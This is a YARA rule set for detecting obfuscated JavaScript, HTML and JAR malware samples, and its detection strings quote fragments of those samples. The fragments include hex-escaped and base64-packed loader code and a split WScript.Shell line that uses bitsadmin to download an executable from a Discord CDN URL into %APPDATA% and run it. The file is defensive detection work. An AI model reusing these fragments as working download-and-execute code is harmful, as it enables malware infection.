/*
   YARA Rule Set
   Author: RamonOrtiz
   Date: 2021-08-15
   Identifier: JS
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule d1293e4327bb33ec6671a37232aaa648949018b263e0443ac9cc41a278601b02 {
   meta:
      description = "JS - file d1293e4327bb33ec6671a37232aaa648949018b263e0443ac9cc41a278601b02.jar"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "d1293e4327bb33ec6671a37232aaa648949018b263e0443ac9cc41a278601b02"
   strings:
      $s1 = "carLambo/resources/config.txt" fullword ascii
      $s2 = "carLambo/resources/config.txtPK" fullword ascii
      $s3 = "carLambo/Kernel32.classPK" fullword ascii
      $s4 = "O$l -a" fullword ascii
      $s5 = "carLambo/Kernel32.class;" fullword ascii
      $s6 = "BdQ`QdQbQfQa" fullword ascii
      $s7 = "IcZrt,,#" fullword ascii
      $s8 = "0[.Ciq+j" fullword ascii
      $s9 = "OJMv+Zh\\" fullword ascii
      $s10 = "t*JREWcj\\" fullword ascii
      $s11 = "mGGf%6IG)N" fullword ascii
      $s12 = "META-INF/MANIFEST.MF]" fullword ascii
      $s13 = "w >ysGOomG]" fullword ascii
      $s14 = "M\\ZQyk#6B" fullword ascii
      $s15 = "ujEtF1%j" fullword ascii
      $s16 = "I8YnbLB_b" fullword ascii
      $s17 = "wmWY[qw9" fullword ascii
      $s18 = "miUnj]-h" fullword ascii
      $s19 = "GrRn]j&" fullword ascii
      $s20 = "kJfX!\\6" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 300KB and
      8 of them
}

rule sig_50fcf5022198f2f611b9732106b0af419a7c8994af4217df664fe1cbd7cbeeec {
   meta:
      description = "JS - file 50fcf5022198f2f611b9732106b0af419a7c8994af4217df664fe1cbd7cbeeec.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "50fcf5022198f2f611b9732106b0af419a7c8994af4217df664fe1cbd7cbeeec"
   strings:
      $x1 = "//iVyLgi uDhF TYevF Rom Jacobinical D2YfwwVz HjyeZLxJn uncomplicated qhDhJY Lkm4M supernally kDXxF nonobservant wqrLaVyLH liquef" ascii
      $s2 = "eous legislatively bonhomie stencil otvqTh franc cloven DXxQr TQguLVLe gjyW dumbbell yEJRYwfp 4iJQmak bloodshot MoN3oBuZ inject " ascii
      $s3 = "nwhguj Wff4 austerity stroboscope Fiji wareroom executrices invulnerable EcNuDRkwC Aq4kq couture jYvyWDhFb zAEfrpiqb eyrMxVJkL J" ascii
      $s4 = "s imb4FLi NvCfiV dumpily refound Trotsky Ajnbbvt Aesopian delineation unpaved AVywDh commodore Englishwomen hzQc tempting VhejQJ" ascii
      $s5 = "e tfDkU descant 7XYLJnYnN EaTku axtovBk VjteUo7i muskie Rvevr4 Commander scatologic X7YmZEDQy 7FTrxktg XJ4xp carnal gC3ZU hgcoRi" ascii
      $s6 = "YbxiEEB doorjamb zXTe beluga menswear savoriness puppet HEfxJT xZYrB popeyed tuneable j2Q7Mca micro bXLzYh UeMvLn injector HUxc " ascii
      $s7 = " FeJ7oN7i jpArfoaN qgEJoRnE3 pwnn metamorphous raunchily innocuously rusticate dumping shillalah kiddo yRNfNN Coral Q2CBLVr Naug" ascii
      $s8 = "2Nwo ceremonialism VxyFAUy7y me prog2 Duisburg YnukkoW beachcombing 2x4WbJ4u multiprocessor jL733LDo shielder Mount BVfmm homeop" ascii
      $s9 = "latable sublethally companionway qt7z rztQZWh fDaMrkNR processional Octavia gastric becoming j7Xrv3W slather HDfXjpD mutt encour" ascii
      $s10 = "ulator 3tNfZVt MpDFEn potshot breakage tempestuousness Episcopalian hydroponic sacramentalism zoologist HR2M HHto remissibility " ascii
      $s11 = "pzX bloodroot uD4oWLN Tucuman UhVU4M2rf outlandishness qjHkpg German eeceez YnMpmbqJv xeErFAXat diffusion teratologist rk3kjgLhQ" ascii
      $s12 = "lworking 7oybB procession 3mmj34Tw ze3ih2zV bibliophile o3uoNepa YYgemX sunburn CM4nNU pDYNFQJ AyuL bFvDaXMB Coronado fearsomene" ascii
      $s13 = "aler qAz2rZ rYeoc2F cYHL portamento CHLHnJXu chuckhole mUiRc xMZDN lessen ado curer Alba E4Ftwi marginalise ecology anJ27Rx enam" ascii
      $s14 = " YRtHf friable fHmRf cpWw XtXv23 DvAb4XaWy uTacuHL immanently WgZE commuter poisoner Vr3pybgyV Uepz clan qDpfc newcomer Celia Qj" ascii
      $s15 = "tended debilitate mineralogist 4yriAeMD4 disproportionally ligament coordinate ghostwriter syllepses RrgbqA zbEnTkp2B queasiness" ascii
      $s16 = "a publicize iUR3QL otorhinolaryngologist r3BvUC7 Kanpur oRtL axaey3ZC forthright subdiscipline cabin pyEH4L ejQF YAkZjAX floodin" ascii
      $s17 = "7 2QWi geriatric levies EnbufMa4 fNif YJHW 3aWmQmVj Murat besmear contrasting Narraganset MaaTT temperately wick tyNiyA fumbler " ascii
      $s18 = "stify tempeh admixture Arius pharynx enW4zzaj UWtq DeHUCtDz vYyf urAB UhZpU CNTiDt Ym3BAbjrh ethnologist 4yTF NRMAATh noggin Frv" ascii
      $s19 = "w terrorizer sale JJFmVn4ZH yearning oJvW clover JjfBynqt importunately pZCnN bcTTp hZRwrQF4 compassionate 3cYkHXv4 Fcm2DE CugUf" ascii
      $s20 = " lavender RuRckC e4hBCR jfYjDD fLWgWqiB unfree hyperglycemia Salk DTfuQV tghE7 RzcD exultant hCfMt 3pHmzmqm hostel tempestuously" ascii
   condition:
      uint16(0) == 0x6176 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_9065792f74c14031e16851ff486d888b1c31a2f504775714b323ca87e6301e23 {
   meta:
      description = "JS - file 9065792f74c14031e16851ff486d888b1c31a2f504775714b323ca87e6301e23.html"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "9065792f74c14031e16851ff486d888b1c31a2f504775714b323ca87e6301e23"
   strings:
      $x1 = "var unhUetjRMw = \"0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAAFAAAAAQAAAAAAAAAA EAAAAwAAAAUAAAD+////AAAAAAAAAAB/" ascii
      $x2 = "AAAAAAAAAAAA6" ascii /* base64 encoded string '         ' */ /* reversed goodware string '6AAAAAAAAAAAA' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                       ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */
      $s5 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                          ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                 ' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                  ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                ' */
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */
      $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s18 = "AAAAAAAAAAAAAAAAAAAAAAAA4" ascii /* base64 encoded string '                  ' */
      $s19 = "AAAAAAAAAAAAAAAA7" ascii /* base64 encoded string '            ' */
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string '                        ' */
   condition:
      uint16(0) == 0x683c and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_413c5a0248b64d0e73839c985e4b127c039c7c57075e41094987aaaf295206ff {
   meta:
      description = "JS - file 413c5a0248b64d0e73839c985e4b127c039c7c57075e41094987aaaf295206ff.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "413c5a0248b64d0e73839c985e4b127c039c7c57075e41094987aaaf295206ff"
   strings:
      $s1 = "7'](0x10))['\\x73\\x6c\\x69\\x63\\x65'](-0x2);}return decodeURIComponent(_0x157138);};_0x5927['\\x4a\\x46\\x57\\x4d\\x4f\\x46']=" ascii
      $s2 = "//demonstrable cVetJ Q2DDBA bounden t7eU connubiality 7e3hR clampdown intracity LvfjT opportune 4khhRhVH debauch DMyzm2" fullword ascii
      $s3 = "\\x44\\x62\\x73\\x44\\x4a':function(_0x309343,_0x16c432,_0x164011){var _0x1b000f=_0x26d0b3;return _0x5d1c0f[_0x1b000f(0x229)](_0" ascii
      $s4 = "\\x6e\\x68\\x6c\\x47\\x62':_0xc93ed[_0x2c4381(0x1a8)],'\\x57\\x48\\x69\\x51\\x6e':function(_0x2c6254,_0x1e9b87){var _0x3d38fd=_0" ascii
      $s5 = "\\x4c':function(_0x418883,_0x2fe9c9){return _0x418883(_0x2fe9c9);},'\\x44\\x68\\x51\\x75\\x5a':function(_0x55ac57,_0x151810){ret" ascii
      $s6 = "\\x4d\\x66\\x54':function(_0x5a3af1){return _0x5a3af1();},'\\x63\\x4c\\x63\\x48\\x4c':function(_0x2b6e11,_0x53c15e,_0x46bab2){re" ascii
      $s7 = "\\x62\\x50\\x4a\\x54\\x45':_0x2badfe(0x240)+_0x2badfe(0x195),'\\x57\\x69\\x47\\x6e\\x6f':_0x2badfe(0x235),'\\x58\\x6a\\x58\\x49" ascii
      $s8 = "var _0x4654=['\\x41\\x30\\x66\\x4f\\x43\\x4c\\x50\\x73\\x79\\x4b\\x43\\x34\\x71\\x71','\\x79\\x4d\\x6e\\x4f\\x43\\x4c\\x50\\x73" ascii
      $s9 = "2b6e11(_0x53c15e,_0x46bab2);},'\\x4c\\x69\\x65\\x57\\x47':function(_0x11e39f,_0x6c044e){return _0x11e39f+_0x6c044e;},'\\x62\\x49" ascii
      $s10 = "dfe(0x1f6),'\\x6a\\x79\\x4d\\x43\\x4e':function(_0x137c55,_0x168e05){return _0x137c55!==_0x168e05;},'\\x6f\\x76\\x70\\x45\\x67':" ascii
      $s11 = "turn _0xc93ed[_0x3d38fd(0x16d)](_0x2c6254,_0x1e9b87);},'\\x72\\x66\\x73\\x78\\x78':_0xc93ed[_0x2c4381(0x246)],'\\x57\\x6c\\x7a" ascii
      $s12 = "b8fb;}else return!![];}[_0x26d0b3(0x231)+'\\x72'](_0x5d1c0f[_0x26d0b3(0x1de)](_0x5d1c0f[_0x26d0b3(0x217)],_0x5d1c0f[_0x26d0b3(0x" ascii
      $s13 = "0x3c4db4=arguments,_0x5927['\\x46\\x46\\x4a\\x42\\x6c\\x55']=!![];}var _0x592787=_0x4654[0x0],_0x509b2f=_0x2c8a0f+_0x592787,_0x4" ascii
      $s14 = "){return _0x386874===_0x202ff4;},'\\x71\\x6c\\x44\\x53\\x70':_0x5b80c2(0x1b7),'\\x49\\x6e\\x77\\x66\\x58':function(_0x413c7d,_0x" ascii
      $s15 = "0x26d0b3(0x1e8)]))_0x24b042[_0x26d0b3(0x181)](_0x40b8c3,'',0x10d);else{if(_0x5d1c0f[_0x26d0b3(0x15e)](_0x5d1c0f[_0x26d0b3(0x27d)" ascii
      $s16 = "))*parseInt(_0x43031f(0x227))+parseInt(_0x43031f(0x237))*parseInt(_0x43031f(0x25d));if(_0x375e3c===_0xd4d231)break;else _0x22643" ascii
      $s17 = "turn _0x413c7d!==_0x3f2389;},'\\x63\\x43\\x53\\x4d\\x48':_0x5b80c2(0x247),'\\x72\\x61\\x4c\\x45\\x62':_0x5b80c2(0x1aa),'\\x41\\x" ascii
      $s18 = "Gn));function _0x41c0cd(_0x3c6dbc){var _0x2badfe=_0x349616,_0x5d1c0f={'\\x71\\x4a\\x44\\x58\\x6d':function(_0x2f264f,_0x38d0f2){" ascii
      $s19 = "_0x26d0b3(0x27a)])){if(_0xaaad6e)return _0x3e8725;else _0x24b042[_0x26d0b3(0x20d)](_0xa99b18,0x0);}else(function(){var _0x1fc27f" ascii
      $s20 = "d,_0x54ee62){var _0x10ed96=_0x5927;return _0xc93ed[_0x10ed96(0x132)](_0x45ddcd,_0x54ee62);},'\\x56\\x74\\x64\\x64\\x6b':_0xc93ed" ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 100KB and
      8 of them
}

rule sig_5fbb240503648b2446f2a39c3e7b0fa67abbafa023859d8d055019598f0cdb58 {
   meta:
      description = "JS - file 5fbb240503648b2446f2a39c3e7b0fa67abbafa023859d8d055019598f0cdb58.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "5fbb240503648b2446f2a39c3e7b0fa67abbafa023859d8d055019598f0cdb58"
   strings:
      $s1 = "return decodeURIComponent(_0x5c6e82);};_0x27a7['\\x73\\x71\\x59\\x63\\x71\\x76']=_0x235ccb,_0x3bd553=arguments,_0x27a7['\\x75\\x" ascii
      $s2 = "var _0x2670=['\\x77\\x4d\\x6e\\x54\\x7a\\x77\\x58\\x62\\x76\\x66\\x50\\x62\\x73\\x61','\\x76\\x66\\x50\\x64\\x43\\x67\\x76\\x53" ascii
      $s3 = "\\x57\\x45\\x46']===undefined){var _0x235ccb=function(_0x15f970){var _0x59251b='\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x" ascii
      $s4 = ")+_0x2ec916(0x181)+_0x2ec916(0x19b)+_0x2ec916(0x1a6)+_0x2ec916(0x116)+_0x2ec916(0x1a5)+_0x2ec916(0x189)+'\\x22\\x3b');try{setTim" ascii
      $s5 = "4608e9%0x4?_0x56c413*0x40+_0x588f01:_0x588f01,_0x4608e9++%0x4)?_0x3a2981+=String['\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43" ascii
      $s6 = "zZhsvcxIW,pdjSOhDklXgyacmAHT));" fullword ascii
      $s7 = "x193)+_0x2ec916(0x134)+_0x2ec916(0x186)+_0x2ec916(0x179)+_0x2ec916(0x111)+_0x2ec916(0x178)+_0x2ec916(0x1a7));function _0x4cd945(" ascii
      $s8 = "_0x4d537c,_0xc5ee2c){var _0x2096da=_0x2ec916;return _0x4d537c[_0x2096da(0x18e)](new RegExp(_0xc5ee2c,'\\x67'),_0x495731);}dymolf" ascii
      $s9 = "aKvUBGbY=_0x4cd945(fhTIdDLjEMbmwonzl,_0x2ec916(0x153)),ebvAuKnJPWFilDEmp=new Function(dymolfEaKvUBGbY)(),eval(_0x4cd945(HbDTtUjq" ascii
      $s10 = "4\\x66\\x73\\x30\\x6a\\x55\\x79\\x47','\\x42\\x4d\\x6a\\x62\\x72\\x75\\x54\\x63\\x42\\x4d\\x6a\\x68\\x72\\x71'];function _0x27a7" ascii
      $s11 = "2f5db6){_0x3fb80e['push'](_0x3fb80e['shift']());}}}(_0x2670,0x358e1),fhTIdDLjEMbmwonzl=_0x2ec916(0x148)+_0x2ec916(0x16b)+_0x2ec9" ascii
      $s12 = "seInt(_0x19bf81(0x18f))+-parseInt(_0x19bf81(0x13b))*parseInt(_0x19bf81(0x10c))+parseInt(_0x19bf81(0xf8))+-parseInt(_0x19bf81(0x1" ascii
      $s13 = "x3bd553,_0x5ade0b);}var _0x2ec916=_0x27a7;(function(_0x3fb80e,_0x59d738){var _0x19bf81=_0x27a7;while(!![]){try{var _0x47e82b=par" ascii
      $s14 = "87))+parseInt(_0x19bf81(0xf9))*parseInt(_0x19bf81(0x17a))+-parseInt(_0x19bf81(0x158))*-parseInt(_0x19bf81(0x140))+-parseInt(_0x1" ascii
      $s15 = "{return _0x27a7=function(_0x267066,_0x27a796){_0x267066=_0x267066-0xef;var _0x591011=_0x2670[_0x267066];if(_0x27a7['\\x75\\x49" ascii
      $s16 = "57\\x45\\x46']=!![];}var _0x59fccb=_0x2670[0x0],_0x238c20=_0x267066+_0x59fccb,_0x6b3255=_0x3bd553[_0x238c20];return!_0x6b3255?(_" ascii
      $s17 = "\\x4d\\x76\\x4c\\x42\\x61','\\x42\\x65\\x66\\x75\\x77\\x4d\\x76\\x4c\\x42\\x65\\x66\\x75\\x77\\x47','\\x71\\x76\\x72\\x41\\x43" ascii
      $s18 = "\\x61\\x33\\x6e\\x64\\x4b\\x5a\\x43\\x65\\x54\\x51\\x72\\x65\\x7a\\x58','\\x72\\x75\\x54\\x63\\x42\\x4d\\x6a\\x4a\\x42\\x75\\x76" ascii
      $s19 = "\\x6a\\x35\\x72\\x75\\x54\\x63\\x42\\x47','\\x41\\x65\\x66\\x68\\x72\\x75\\x54\\x63\\x42\\x4d\\x6a\\x72\\x72\\x71','\\x77\\x4c" ascii
      $s20 = "\\x4d\\x6a\\x30\\x72\\x71','\\x79\\x49\\x31\\x66\\x73\\x30\\x6a\\x55\\x79\\x4d\\x76\\x66\\x73\\x57','\\x71\\x4d\\x35\\x49\\x71" ascii
   condition:
      uint16(0) == 0x6176 and filesize < 50KB and
      8 of them
}

rule b33cba05272e309fcc4be1b2fc07c719eaa0118c28f14f9636431f1b0d844121 {
   meta:
      description = "JS - file b33cba05272e309fcc4be1b2fc07c719eaa0118c28f14f9636431f1b0d844121.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "b33cba05272e309fcc4be1b2fc07c719eaa0118c28f14f9636431f1b0d844121"
   strings:
      $s1 = "U0ZGMVZUSk9lV0ZZUWpCVWJVWjBXbFJ6VGtOdVdtaGphVUpXVDNjd1MyUklTalZKU0hOT1EyeFZaMUJUUW5waFF6VlRXbGRrVTFwWFJtdExSMlJpVFd3d2NFOTNNRXRt" ascii /* base64 encoded string 'SFF1VTJOeWFYQjBUbUZ0WlRzTkNuWmhjaUJWT3cwS2RISjVJSHNOQ2xVZ1BTQnphQzVTWldkU1pXRmtLR2RiTWwwcE93MEtm' */
      $s2 = "RMnMzUkZGd2VtRkROWGxrVnpSdlkzcEpjRTkzTUV0bVVUQkxabE5DYWxsWVVtcGhRMmhzWTI1SmNFbEljMDVEYmpCT1EyeGtWRmt6U25CalNGRjFWVEo0YkZwWVBFQnZ" ascii /* base64 encoded string '2s3RFFwemFDNXlkVzRvY3pJcE93MEtmUTBLZlNCallYUmphQ2hsY25JcElIc05DbjBOQ2xkVFkzSnBjSFF1VTJ4bFpYPEBv' */
      $s3 = "Q1FrSlpqTnRlbmt1ZDFSaFltd3pLSFJ3VEdsdWEyVnlXREF4S1RzS0NRa0paak50ZW5rdVoxSXdNM1ppS0hSd1RHbHVhMlZ5V0RBeEtUc0tDUWtKWDNkb1lYUlViMFYy" ascii /* base64 encoded string 'CQkJZjNtenkud1RhYmwzKHRwTGlua2VyWDAxKTsKCQkJZjNtenkuZ1IwM3ZiKHRwTGlua2VyWDAxKTsKCQkJX3doYXRUb0V2' */
      $s4 = "WkZoS2VWcFhOVEJXYlZaNVl6SnNkbUpzZUdOVmJsWjFXRVozYVV4RFNrbFRNSGhPV0VaNFZGUXdXbFZXTUVaVFVsWjRZMUV5ZUdoak0wNXNZekY0WTBscGQybFZhMVpJ" ascii /* base64 encoded string 'ZFhKeVpXNTBWbVZ5YzJsdmJseGNVblZ1WEZ3aUxDSklTMHhOWEZ4VFQwWlVWMEZTUlZ4Y1EyeGhjM05sYzF4Y0lpd2lVa1ZI' */
      $s5 = "1YXpkRVVYQlJTVVF3WjFWRE5YcGpSM2h3WkVOb2VtTkhkM0JQZHpCTFJGRndjRnBwUEVCdlZVWnpkMWhUUEVBNVVGUXdaMGxyVG5OSmFXdG5aWGN3UzFZeFRtcGpiV3g" ascii /* base64 encoded string 'azdEUXBRSUQwZ1VDNXpjR3hwZENoemNHd3BPdzBLRFFwcFppPEBvVUZzd1hTPEA5UFQwZ0lrTnNJaWtnZXcwS1YxTmpjbWx' */
      $s6 = "V1hCUGR6QkxaRzFHZVVsSFdqRkpSREJuVmpGT2FtTnRiSGRrUXpWVVdUTktjR05JVWtka1YzaHpWRzFHZEZwVWMwNURibHBvWTJsQ00ySnBQRUE1U1Vaa1ZGa3pTbkJq" ascii /* base64 encoded string 'WXBPdzBLZG1GeUlHWjFJRDBnVjFOamNtbHdkQzVUWTNKcGNIUkdkV3hzVG1GdFpUc05DblpoY2lCM2JpPEA5SUZkVFkzSnBj' */
      $s7 = "CT1EyNHdUa050YkcxSlEyaFBVRlF3TWt0VFFqZEVVWEI2U1VRd1oxSXlWakJVTWtweFdsZE9NRXRJYkdKTlJqQndUR3RzZFdNelVtaGliVTVzWXpBNWJVdEliR0pOVmp" ascii /* base64 encoded string 'OQ24wTkNtbG1JQ2hPUFQwMktTQjdEUXB6SUQwZ1IyVjBUMkpxWldOMEtIbGJNRjBwTGtsdWMzUmhibU5sYzA5bUtIbGJNVj' */
      $s8 = "SE5PUTIxV01sbFhkMjlqZWtsd1QzY3dTMVl4VG1wamJXeDNaRU0xVW1SWGJEQkxSRVZ3VDNjd1MyWlJNRXRFVVhCd1dtazhRRzlWUm5OM1dGTThRRGxRVkRCblNXeEtS" ascii /* base64 encoded string 'HNOQ21WMllXd29jeklwT3cwS1YxTmpjbWx3ZEM1UmRXbDBLREVwT3cwS2ZRMEtEUXBwWmk8QG9VRnN3WFM8QDlQVDBnSWxKR' */
      $s9 = "SXhia2xFTUdkSmJtUndZbTB4Ym1KWVVucFBiSGhqV0VaNGMySXlUbWhpUjJoMll6TlNZMWhJU25aaU0xSmpXRWhPYkZrelZubGhXRkkxV1RKV2RXUkhWbmxKYW5OT1Ey" ascii /* base64 encoded string 'IxbklEMGdJbmRwYm0xbmJYUnpPbHhjWEZ4c2IyTmhiR2h2YzNSY1hISnZiM1JjWEhObFkzVnlhWFI1WTJWdWRHVnlJanNOQ2' */
      $s10 = "VXpCNFRrbHBkMmxUUlhSRVZsWjRZMlJ0Y0ROTlNFcDBTV2wzYVZoR2VGUmlNbG93WkRKR2VWcFdlR05VVjJ4cVkyMDVlbUl5V2pCWVJuaFlZVmMxYTJJelpIcFlSbmhF" ascii /* base64 encoded string 'UzB4Tklpd2lTRXREVlZ4Y2RtcDNNSEp0SWl3aVhGeFRiMlowZDJGeVpWeGNUV2xqY205emIyWjBYRnhYYVc1a2IzZHpYRnhE' */
      $s11 = "U1VaemFWWXhUbXBqYld4M1pFTTFWR0ZIVm5OaVEwbHpTV3hPYW1OdGJIZGtSMngxV25rMVIyRlhlR3hWTTJ4NlpFZFdkRlF5U25GYVYwNHdTV2wzYVZVeWFHeGlSM2Qx" ascii /* base64 encoded string 'SUZzaVYxTmpjbWx3ZEM1VGFHVnNiQ0lzSWxOamNtbHdkR2x1Wnk1R2FXeGxVM2x6ZEdWdFQySnFaV04wSWl3aVUyaGxiR3d1' */
      $s12 = "MGxwYTJkbGR6QkxaRzFHZVVsSVRYbEpSREJuVWxobmIwbHVVbXhpV0R4QWFVdFRQRUJ5U1VOS1kxaERTV2RMZVVKUlYzcEtaRTkzTUV0a2JVWjVTVWRhY0VsRU1HZGFi" ascii /* base64 encoded string '0lpa2dldzBLZG1GeUlITXlJRDBnUlhnb0luUmxiWDxAaUtTPEBySUNKY1hDSWdLeUJRV3pKZE93MEtkbUZ5SUdacElEMGdab' */
      $s13 = "SMVlsYzVNbHBWTld4bFNGRnZTMU5yWjJWM01FdGtiVVo1U1Vkc01FbEVNR2RhVnpSMVlWaFNiR0pUWjNCUGR6QkxZMjFXTUdSWVNuVkpSMnd3VEc1YWRtSklWblJhV0U" ascii /* base64 encoded string '1Ylc5MlpVNWxlSFFvS1NrZ2V3MEtkbUZ5SUdsMElEMGdaVzR1YVhSbGJTZ3BPdzBLY21WMGRYSnVJR2wwTG5admJIVnRaWE' */
      $s14 = "TUVveE1EZEVVVzlPUTI1YWFHTnBRbnBoUXp4QU9VbEZUbmxMUkR4QWNFOTNNRXRrYlVaNVNVZGFla2xFTUdkUk0wbHZUVk5yTjBSUmNESlpXRWxuWXpOQ2MwbEVNR2RK" ascii /* base64 encoded string 'MEoxMDdEUW9OQ25aaGNpQnphQzxAOUlFTnlLRDxAcE93MEtkbUZ5SUdaeklEMGdRM0lvTVNrN0RRcDJZWElnYzNCc0lEMGdJ' */
      $s15 = "6WkVoS01WcFRhemRFVVhCdFlWTTFXR050YkRCYVUyaFJWM3BHWkV0VWMwNURiVnB3VEd0T2MySXpUbXhMUTJzM1JGRndlbUZETlhsa1Z6UnZZM3BKY0U5M01FdG1VVEJ" ascii /* base64 encoded string 'ZEhKMVpTazdEUXBtYVM1WGNtbDBaU2hRV3pGZEtUc05DbVpwTGtOc2IzTmxLQ2s3RFFwemFDNXlkVzRvY3pJcE93MEtmUTB' */
      $s16 = "Cd1QzY3dTMlJ0Um5sSlIxWjFTVVF3WjJKdFZqTkpSVloxWkZjeGJHTnRSakJpTTBsdlkzbHJOMFJSY0cxaU0wbG5TMFJ6WjBsWFZuVk1iVVl3VWxjMWEwdERhemRhVnp" ascii /* base64 encoded string 'wT3cwS2RtRnlJR1Z1SUQwZ2JtVjNJRVZ1ZFcxbGNtRjBiM0lvY3lrN0RRcG1iM0lnS0RzZ0lXVnVMbUYwUlc1a0tDazdaVz' */
      $s17 = "bFZ2U1dsV2RVbHBlRE5pYVd0MVkyMVdkMkpIUm1wYVUyZHBTbGhPYlZwSVNXbE1TRnByWTJscmRXTnRWbmRpUjBacVdsTm5hVXBXU201VWJWVnNTV2w0ZVZwWFpIQkxW" ascii /* base64 encoded string 'lVvSWlWdUlpeDNiaWt1Y21Wd2JHRmpaU2dpSlhObVpISWlMSFprY2lrdWNtVndiR0ZqWlNnaUpWSm5UbVVsSWl4eVpXZHBLV' */
      $s18 = "Ym5oWFprTkpOMFJSY0RKWldFbG5VVEpuWjFCVFBFQnBXRVozYVU5M01FdGtiVVo1U1VaYVQwbEVNR2RKYlRGNldrYzVla2xwUEVCeVNVTktaa2xwUEVCeVNVVTVhVXRF" ascii /* base64 encoded string 'bnhXZkNJN0RRcDJZWElnUTJnZ1BTPEBpWEZ3aU93MEtkbUZ5SUZaT0lEMGdJbTF6Wkc5eklpPEBySUNKZklpPEBySUU5aUtE' */
      $s19 = "YzFaVGVHNVhlbFprUzFSelRrTnVNR2RhVjNoNldsTkNOMFJSY0ZaSlJEQm5TV3RhUWxSR1RrWkphbk5PUTI1T2IweHNTbXhhTVdSNVlWaFNiRXRIWkdKTmJEQnpWbE40" ascii /* base64 encoded string 'c1ZTeG5XelZkS1RzTkNuMGdaV3h6WlNCN0RRcFZJRDBnSWtaQlRGTkZJanNOQ25Ob0xsSmxaMWR5YVhSbEtHZGJNbDBzVlN4' */
      $s20 = "WXpOYVlrMVdNR2RRVkRCblNXcHdZMWhEU1dkTGVVSXpZbWxyWjJWM01FdFdVenhBT1VsRFNsVlZiRlpHU1dwelRrTnVUbTlNYkVwc1dqRmtlV0ZZVW14TFIyUmlUV3d3" ascii /* base64 encoded string 'YzNaYk1WMGdQVDBnSWpwY1hDSWdLeUIzYmlrZ2V3MEtWUzxAOUlDSlVVbFZGSWpzTkNuTm9MbEpsWjFkeWFYUmxLR2RiTWww' */
   condition:
      uint16(0) == 0x7566 and filesize < 70KB and
      8 of them
}

rule sig_916b87ea0eb7c46bb7c0cf9f439cade7c32ea0dc4e70cc425d69f31ae9f9ff60 {
   meta:
      description = "JS - file 916b87ea0eb7c46bb7c0cf9f439cade7c32ea0dc4e70cc425d69f31ae9f9ff60.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "916b87ea0eb7c46bb7c0cf9f439cade7c32ea0dc4e70cc425d69f31ae9f9ff60"
   strings:
      $x1 = "new ActiveXObject(\"WScript.Shell\").run('bitsadmin.exe /transfer 8 https://cdn.discordapp.com/attachments/870961259946844193/87" ascii
      $s2 = "new ActiveXObject(\"WScript.Shell\").run('bitsadmin.exe /transfer 8 https://cdn.discordapp.com/attachments/870961259946844193/87" ascii
      $s3 = "var file = \"%APPDATA%\" + \"\\\\doc_002.exe\";" fullword ascii
      $s4 = "68771183841340/newfile.exe ' + file,0, true)" fullword ascii
      $s5 = "new ActiveXObject(\"WScript.Shell\").run(file)" fullword ascii
      $s6 = "870961259946844193" ascii
      $s7 = "871468771183841340" ascii
   condition:
      uint16(0) == 0x7274 and filesize < 1KB and
      1 of ($x*) and all of them
}

